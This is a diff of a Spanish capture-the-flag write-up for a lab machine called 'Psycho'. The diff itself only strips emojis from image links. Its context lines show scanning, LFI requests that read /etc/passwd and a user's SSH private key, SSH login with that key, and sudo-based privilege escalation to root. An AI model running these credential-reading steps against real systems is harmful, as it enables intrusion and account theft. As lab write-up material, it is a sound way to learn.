@@ -41,7 +41,7 @@ Usamos `nmap` para detectar los puertos abiertos:
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
 ```
 
-📸 ![](/Psycho/Imagenes/Puertos.jpeg)
+ ![](/Psycho/Imagenes/Puertos.jpeg)
 
 Usamos un script personalizado `extractPorts` para facilitar el siguiente escaneo:
 
@@ -49,7 +49,7 @@ Usamos un script personalizado `extractPorts` para facilitar el siguiente escane
 nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
 ```
 
-📸 ![](/Psycho/Imagenes/Servicios.jpeg)
+ ![](/Psycho/Imagenes/Servicios.jpeg)
 
 ---
 
@@ -67,12 +67,12 @@ Ejecutamos `gobuster` para encontrar directorios y archivos ocultos:
 gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
 ```
 
-📸 ![](/Psycho/Imagenes/Gobuster.jpeg)
+ ![](/Psycho/Imagenes/Gobuster.jpeg)
 
 Se encontraron dos rutas relevantes:
 
 * `/assets`
-  📸 ![](/Psycho/Imagenes/Directorio.jpeg)
+   ![](/Psycho/Imagenes/Directorio.jpeg)
 
 * `/index.php/assets#` (mediante fuzzing manual)
   📸 ![](/Psycho/Imagenes/Oculto.jpeg)
@@ -85,7 +85,7 @@ Descargamos una imagen y la analizamos con `exiftool` buscando metadatos sensibl
 exiftool background.jpg
 ```
 
-📸 ![](/Psycho/Imagenes/Metadatos.jpeg)
+ ![](/Psycho/Imagenes/Metadatos.jpeg)
 
 ---
 
@@ -97,7 +97,7 @@ En el código fuente de la página se observó un posible error, que explotamos 
 curl -s -X GET "http://172.17.0.2/?secret=/etc/passwd" | grep "sh$"
 ```
 
-📸 ![](/Psycho/Imagenes/Usuarios.jpeg)
+ ![](/Psycho/Imagenes/Usuarios.jpeg)
 
 Esto nos revela usuarios del sistema con shell válido, entre ellos:
 `root`, `ubuntu`, `vaxei`, `luisillo`
@@ -112,8 +112,9 @@ Aprovechamos la vulnerabilidad LFI para extraer la clave privada de SSH del usua
 curl -s -X GET "http://172.17.0.2/?secret=/home/vaxei/.ssh/id_rsa"
 ```
 
-📸 ![](/Psycho/Imagenes/curlKey.jpeg)
-📸 ![](/Psycho/Imagenes/Key.jpeg)
+ ![](/Psycho/Imagenes/curlKey.jpeg)
+ 
+ ![](/Psycho/Imagenes/Key.jpeg)
 
 Guardamos la clave como `id_rsa` y le damos permisos adecuados:
 
@@ -127,7 +128,7 @@ Nos conectamos vía SSH:
 ssh -i id_rsa vaxei@172.17.0.2
 ```
 
-📸 ![](/Psycho/Imagenes/webshell.jpeg)
+ ![](/Psycho/Imagenes/webshell.jpeg)
 
 ---
 
@@ -159,7 +160,7 @@ Verificamos los privilegios `sudo` del usuario `vaxei`:
 sudo -l
 ```
 
-📸 ![](/Psycho/Imagenes/Escalada.jpeg)
+ ![](/Psycho/Imagenes/Escalada.jpeg)
 
 El resultado indica que `vaxei` puede ejecutar `perl` como el usuario `luisillo` sin contraseña:
 
@@ -194,7 +195,7 @@ sudo /usr/bin/python3 /opt/paw.py
 
 Esto lanza una shell como **root**.
 
-📸 ![](/Psycho/Imagenes/root.jpeg)
+ ![](/Psycho/Imagenes/root.jpeg)
 
 ---
 
